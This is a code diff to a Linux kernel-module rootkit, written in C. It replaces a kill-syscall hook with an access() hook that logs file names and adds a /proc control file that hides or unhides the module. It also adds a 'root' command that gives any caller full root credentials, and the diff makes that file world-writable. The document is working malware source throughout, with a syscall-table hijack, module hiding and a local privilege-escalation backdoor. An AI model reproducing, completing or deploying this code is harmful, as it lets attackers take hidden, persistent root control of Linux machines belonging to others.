@@ -28,7 +28,7 @@ static unsigned long *syscall_table;
 
 static struct path proc_path;
 typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
-static sys_call_ptr_t original_kill;
+static sys_call_ptr_t original_access;
 
 // Module hiding
 
@@ -75,38 +75,44 @@ unsigned long *find_syscall_table(void)
     return (unsigned long *)kallsyms_lookup_name("sys_call_table");
 }
 
-asmlinkage long hacked_kill(const struct pt_regs *pt_regs)
+asmlinkage long hacked_access(const struct pt_regs *pt_regs)
 {
-    // pid_t pid = (pid_t)pt_regs->di;
-    int sig = (int)pt_regs->si;
-
-    switch (sig)
-    {
-    case 9000:
-        if (module_hidden)
-            module_unhide();
-        else
-            module_hide();
-        break;
-    default:
-        return original_kill(pt_regs);
-        break;
-    }
-    return 0;
+    const char __user *filename = (const char __user *)pt_regs->di;
+    int mode = (int)pt_regs->si;
+    pr_info("Access: %s\n", filename);
+    // char *env_var = getenv(ENV_VAR);
+    return original_access(pt_regs);
 }
 
 // Proc file interface
 
 static ssize_t rk_proc_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos)
 {
-    pr_info("read handler\n");
     return 0;
 }
 
 static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos)
 {
-    pr_info("write handler\n");
-    return -1;
+    if (strncmp(ubuf, "toggle", MIN(6, count)) == 0)
+    {
+        if (module_hidden)
+            module_unhide();
+        else
+            module_hide();
+    }
+    else if (strncmp(ubuf, "root", MIN(4, count)) == 0)
+    {
+        struct cred *creds = prepare_creds();
+        if (creds != NULL)
+        {
+            creds->uid.val = 0;
+            creds->gid.val = 0;
+            creds->euid.val = 0;
+            creds->egid.val = 0;
+        }
+        commit_creds(creds);
+    }
+    return count;
 }
 
 static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
@@ -139,7 +145,7 @@ static const struct file_operations proc_rootkit_fops = {
 static int proc_init(void)
 {
     // Create entry for controlling rootkit
-    proc_rootkit = proc_create(PROCFILE_NAME, S_IRUGO | S_IWUSR, NULL, &proc_rootkit_fops);
+    proc_rootkit = proc_create(PROCFILE_NAME, S_IRUGO | S_IWUGO, NULL, &proc_rootkit_fops);
     if (!proc_rootkit)
         return -1;
 
@@ -187,11 +193,11 @@ static int __init lkm_rootkit_init(void)
     syscall_table = find_syscall_table();
     pr_info("Found syscall_table at %lx\n", *syscall_table);
 
-    original_kill = (sys_call_ptr_t)syscall_table[__NR_kill];
+    original_access = (sys_call_ptr_t)syscall_table[__NR_access];
 
     disable_write_protect();
 
-    syscall_table[__NR_kill] = (unsigned long)hacked_kill;
+    syscall_table[__NR_access] = (unsigned long)hacked_access;
 
     enable_write_protect();
 
@@ -204,7 +210,7 @@ static void __exit lmk_rootkit_exit(void)
 
     disable_write_protect();
 
-    syscall_table[__NR_kill] = (unsigned long)original_kill;
+    syscall_table[__NR_access] = (unsigned long)original_access;
 
     enable_write_protect();
 
